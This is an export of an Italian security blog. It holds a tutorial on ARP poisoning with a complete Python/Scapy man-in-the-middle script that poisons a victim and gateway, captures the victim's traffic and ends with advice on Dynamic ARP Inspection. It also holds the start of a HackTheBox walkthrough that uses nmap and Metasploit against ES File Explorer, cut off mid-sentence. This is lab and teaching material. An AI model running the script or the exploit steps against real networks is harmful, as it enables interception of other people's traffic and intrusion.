[{"categories":null,"contents":"Mi chiamo Lombardi Angelo Nunzio, in arte, k0Br@3390 e questo √® SpaceHack, il mio blog. Su di esso troverai contenuti di informatica, programmazione e cyber security. Questo spazio serve a me come valvola di sfogo nel parlare a chi √® davvero interessato a questo mondo e a coloro che sono interessati davvero a questo mondo come il sottoscritto. Detto questo, happy coding e sopratutto, happy hacking üëΩ.\n[ Github ]\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/about/","tags":null,"title":"About"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Cos\u0026rsquo;√® il Protocollo ARP Che cos‚Äô√® l‚ÄôARP Poisoning ARP Poisoning con Scapy e Python Come prevenire L\u0026rsquo;ARP Poisoning con DAI  In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l\u0026rsquo;ARP Poisoning.\nHo iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.\nCos\u0026rsquo;√® il Protocollo ARP Per approfondire l\u0026rsquo;argomento ti consigli di leggere questo.\nA differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l‚Äôindirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell‚Äôhardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si pu√≤ applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell‚Äôindirizzo tramite ARP √® perci√≤ indispensabile.\nSe ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l‚Äôindirizzo MAC appropriato. Cos√¨ entra in azione l‚ÄôAddress Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l‚Äôindirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese ‚ÄúARP request‚Äù) a tutti i dispositivi in rete, questa richiesta comprende all‚Äôincirca le seguenti informazioni:\n Un computer con l\u0026rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l\u0026rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell\u0026rsquo;indirizzo MAC giusto.\n La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete √® collegato a una tabella locale, detta cache ARP, per evitare che prima dell‚Äôinvio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell‚ÄôIP assegnato.\nTutti i computer nella rete annotano cos√¨ nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Per√≤ ci si aspetta una risposta broadcast solo dal computer B, che invia un‚ÄôARP reply comprendente le seguenti informazioni:\n Qui il sistema con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz. L\u0026rsquo;indirizzo MAC ricercato √® aa-aa-aa-aa-aa-aa.\n Se un‚ÄôARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perci√≤ la comunicazione attraverso la rete locale non incontra nessun ostacolo.\nMa cosa succede se non √® il computer di destinazione ricercato a rispondere, bens√¨ un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l‚ÄôARP poisoning.\nOra che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante pu√≤ usare le falle del protocollo per i suoi scopi.\nChe cos‚Äô√® l‚ÄôARP Poisoning Lo schema request-response del protocollo ARP √® creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell‚ÄôARP spoofing, gli hacker cercano perci√≤ di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare cos√¨ la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perch√© si intende un ‚Äúavvelenamento‚Äù della cache ARP. Di solito il pacchetto comprende anche l‚Äôindirizzo MAC di un dispositivo di rete, controllato dall‚Äôhacker. Il sistema della vittima collega cos√¨ l‚ÄôIP di uscita con un indirizzo dell‚Äôhardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall‚Äôhacker, che ha cos√¨ la possibilit√† di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene cos√¨ con l‚Äôinganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bens√¨ rifiutati, l‚ÄôARP poisoning pu√≤ comportare un Denial of Service (DoS). Un‚Äôaltra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; per√≤ questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l‚Äôintenzione di accettare una risposta. √à quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.\nARP Poisoning con Scapy e Python Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.\n Disclaimer: ‚ö†Ô∏è Quello che starete per vedere √® un esempio di attacco informatico che sto svolgendo su sistemi di mia propriet√†. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione √® un illecito. ‚ö†Ô∏è\n Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.\nPer prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:\nifconfig [interface] interface dovr√† essere sostituito con il nome dell‚Äôinterfaccia di rete della macchina vittima, nel mio caso l‚Äôinterfaccia √® wlp61s0, l‚Äôoutput dovr√† essere un qualcosa simile a:\nwlp61s0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.1.22 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fe80::bf57:5b8e:8ef6:fe0b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether b4:6b:fc:a3:63:99 txqueuelen 1000 (Ethernet) RX packets 190150 bytes 230866258 (230.8 MB) RX errors 0 dropped 2237 overruns 0 frame 0 TX packets 52365 bytes 14313727 (14.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Il comando ifconfig ci mostra la configurazione della rete per un‚Äôinterfaccia specifica (in quest‚Äôesempio √® la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.\nL‚Äôoutput mostra che l‚Äôindirizzo inet (IPv4) per il dispositivo √® 192.168.1.22. √à mostrato anche l‚Äôindirizzo mac ether che √® b4:6b:fc:a3:63:99.\nOra vediamo la cache ARP della macchina vittima, usiamo il comando:\narp -a Il risultato √® qualcosa del tipo:\nwind3.hub (192.168.1.1) associato a b8:d5:26:69:b5:dc [ether] su wlp61s0 Kobra3390.wind3.hub (192.168.1.233) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 192.168.1.233 √® l‚Äôindirizzo IP della macchina Kali, mentre 192.168.1.1 √® l‚Äôindirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell‚Äôindirizzo MAC registrato per il gateway.\nConoscendo l‚Äôindirizzo IP dell‚Äôattaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): pass class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): pass def run(self): pass def poison(self): pass def sniff(self, count=200): pass def restore(self): pass if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Come si vede, definiamo una funzione helper per ottenere l‚Äô indirizzo MAC per una determinata macchina e una classe Arper per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione get_mac che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:\ndef get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None Le passiamo l‚Äôindirizzo IP dell‚Äôobiettivo e creiamo un pacchetto. La funzione Ether specifica che il pacchetto √® concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l‚Äôindirizzo MAC collegato chiedendo a ogni nodo della rete se √® in possesso di quell‚Äôindirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy srp che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile resp che dovrebbe contenere la sorgente Ether (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe Arper:\nclass Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l‚Äôinterfaccia che vogliamo utilizzare (eth0 √® l‚Äôopzione di default). Popoliamo le variabili interne dell‚Äôoggetto con interface, victim, victimmac, gateway e gatewaymac stampandone i valori a console.\nAll‚Äôinterno della classe Arper scriviamo la funzione run che rappresenta l‚Äôentry point del nostro attacco:\ndef run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) Il metodo run esegue tutto il lavoro principale dell‚Äôoggetto Arper. Imposta ed esegue due processi:\n Il primo avvelena la cache ARP Il secondo ci permette di osservare l‚Äôevoluzione dell‚Äôattacco sniffando il traffico di rete  Il metodo poison produce i pacchetti ‚Äúavvelenati‚Äù e li invia alla vittima e al gateway:\ndef poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) Il metodo poison imposta i dati che useremo per ‚Äúavvelenare‚Äù la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP poisoned per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l‚Äôindirizzo IP della vittima ma con il MAC dell‚Äôaggressore. Facciamo poi lo stesso inviando alla vittima l‚Äôindirizzo IP del gateway ma con il MAC address dell‚Äôaggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.\nPoi iniziamo a spedire i pacchetti ‚Äúavvelenati‚Äù alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell‚Äôattacco.\nPorremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da l√¨ ripristineremo la situazione riportandola alla normalit√†, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.\nPer vedere e registrare cosa succede durante le nostre operazioni di poisoning, intercettiamo il traffico di rete con il metodo sniff:\ndef sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) Il metodo sniff resta in pausa per cinque secondi prima di iniziare lo sniffing per dare tempo al thread che esegue il vero e proprio poisoning di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l‚Äôindirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo arper.pcap, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l‚Äôattacco.\nDa ultimo, il metodo restore riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:\ndef restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) Il metodo restore potrebbe essere chiamato sia da poison (dopo un CTRL-C), sia da sniff (quando il numero di pacchetti richiesti √® stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.\nEcco il codice completo:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) def run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) self.sniff_thread.start() def poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) def sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) def restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Prima di avviare l‚Äôattacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:\nsudo echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward Ora che l‚ÄôIP forwarding √® stato importato, avviamo lo script con:\nsudo python3 arper.py [IP vittima] [IP gateway] [interface] Ad esempio:\nsudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0 L‚Äôoutput durante l‚Äôattacco:\n? (192.168.1.1) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 ? (192.168.1.176) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 Si vede che la vittima malcapitata ha una cache ARP compromessa, poich√® il gateway risulta avere lo stesso indirizzo MAC dell‚Äôattaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.\nCome prevenire L\u0026rsquo;ARP Poisoning con DAI L\u0026rsquo;ispezione ARP dinamica (DAI) √® una funzione di sicurezza che rifiuta i pacchetti ARP non validi e dannosi. La funzione impedisce una classe di attacchi man-in-the-middle, in cui una stazione ostile intercetta il traffico per altre stazioni avvelenando le cache ARP dei suoi ignari vicini. Il malintenzionato invia richieste o risposte ARP mappando l\u0026rsquo;indirizzo IP di un\u0026rsquo;altra stazione al proprio indirizzo MAC.\nDAI si basa sullo snooping DHCP. Lo snooping DHCP ascolta gli scambi di messaggi DHCP e crea un database di associazioni di tuple valide (indirizzo MAC, indirizzo IP, interfaccia VLAN).\nQuando DAI √® abilitato, lo switch elimina il pacchetto ARP se l\u0026rsquo;indirizzo MAC e l\u0026rsquo;indirizzo IP del mittente non corrispondono a una voce nel database dei binding di snooping DHCP. Tuttavia, pu√≤ essere superato attraverso mappature statiche. I mapping statici sono utili quando gli host configurano indirizzi IP statici, lo snooping DHCP non pu√≤ essere eseguito o altri switch nella rete non eseguono l\u0026rsquo;ispezione ARP dinamica. Una mappatura statica associa un indirizzo IP a un indirizzo MAC su una VLAN.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/","tags":["Protocollo ARP","ARP Poisoning","Python","Scapy","DAI"],"title":"Introduzione All'ARP Poisoning"},{"categories":["Walkthrough HackTheBox"],"contents":"Table of Contents:\n Enumerazione con Nmap Analisi delle porte  Sfruttamento dell‚ÄôExploit con Metasploit Sfruttamento dell‚ÄôExploit con CVE (Script Python)   Privilage Escalation  Explore √® una macchina Android di facile difficolt√†. L‚Äôenumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un‚Äôulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo cos√¨ l‚Äôaccesso remoto alla macchina. Infine, l‚Äôaggressore √® in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l‚ÄôAndroid Debug Bridge (ADB). Questa eventualit√† consente all‚Äôutente malintenzionato di eseguire comandi come utente root.\nEnumerazione con Nmap Eseguiamo l‚Äôenumerazione dei servizi con Nmap, facciamo una prima scansione con il seguente comando:\n1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.247 | grep ^[0-9] | cut -d \u0026#39;/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s/,$//) 2. nmap -p$ports -sC -sV [address] L‚Äôoutput sar√†:\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 09:58 EST Nmap scan report for explore (10.10.10.247) Host is up (0.039s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 7190e3a7c95d836634883debb4c788fb (RSA) 5555/tcp filtered freeciv 34245/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 29 Nov 2022 14:59:13 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:18 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????\u0026lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 29 Nov 2022 14:59:34 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.93%I=7%D=11/29%Time=63861E0F%P=x86_64-pc-linux-gnu%r(N SF:ULL,24,\u0026#34;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port34245-TCP:V=7.93%I=7%D=11/29%Time=63861E0E%P=x86_64-pc-linux-gnu%r( SF:GenericLines,AA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2 SF:029\\x20Nov\\x202022\\x2014:59:13\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n SF:\\r\\nInvalid\\x20request\\x20line:\\x20\u0026#34;)%r(GetRequest,5C,\u0026#34;HTTP/1\\.1\\x20412 SF:\\x20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014: SF:59:13\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,B5,\u0026#34;HTTP/1 SF:\\.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\ SF:x2014:59:18\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x SF:20supported:\\x20OPTIONS\u0026#34;)%r(RTSPRequest,BB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:18\\x20GMT\\r\\nCon SF:tent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\ SF:r\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version SF::\\x20\\x20RTSP/1\\.0\u0026#34;)%r(Help,AE,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nD SF:ate:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length: SF:\\x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnectio SF:n:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\u0026#34;)%r(SSLSessionRe SF:q,DD,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2029\\x20Nov\\ SF:x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x2 SF:0text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid SF:\\x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\ SF:?\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?\u0026lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\u0026#34;)%r(TerminalS SF:erverCookie,CA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x20 SF:29\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mst SF:shash=nmap\u0026#34;)%r(TLSSessionReq,DB,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\n SF:Date:\\x20Tue,\\x2029\\x20Nov\\x202022\\x2014:59:34\\x20GMT\\r\\nContent-Length SF::\\x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnecti SF:on:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\ SF:0e\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\u0026#34;); Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 101.61 seconds Analisi delle porte Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso √© 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:\nQuesto sito web mostra le assegnazioni delle porte e le vulnerabilit√† note.\nNello snippet di cui sopra possiamo vedere che la porta 5555 √® utilizzata da Android Debug Bridge (ADB). Android Debug Bridge (adb) √® uno strumento a riga di comando che consente agli utenti di comunicare con un dispositivo Android. Dato che la porta 5555 √® filtrata e non √® possibile connettersi tramite adb, cerchiamo online la porta 59777 che rivela il seguente risultato:\nQuesta porta √® utilizzata dall‚Äôapplicazione ES File Explorer File Manager per Android, secondo questo sito web. Questo sito web indica anche una vulnerabilit√† nota per questa applicazione, in cui un utente malintenzionato √® in grado di eseguire comandi arbitrari sull‚Äôhost. Di seguito vedremo due metodologie per raccogliere le credenziali ssh.\nSfruttamento dell‚ÄôExploit con Metasploit La ricerca nel framework metasploit rivela un modulo per questa vulnerabilit√†:\n1. msfconsole 2. search es file explorer  Il modulo di interesse √®:\n# Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/es_file_explorer_open_port 2019-01-16 normal No ES File Explorer Open Port Utilizziamo questo modulo ed elenchiamo le sue opzioni:\n1. use auxiliary/scanner/http/es_file_explorer_open_port 2. options  Successivamente, si imposta il parametro 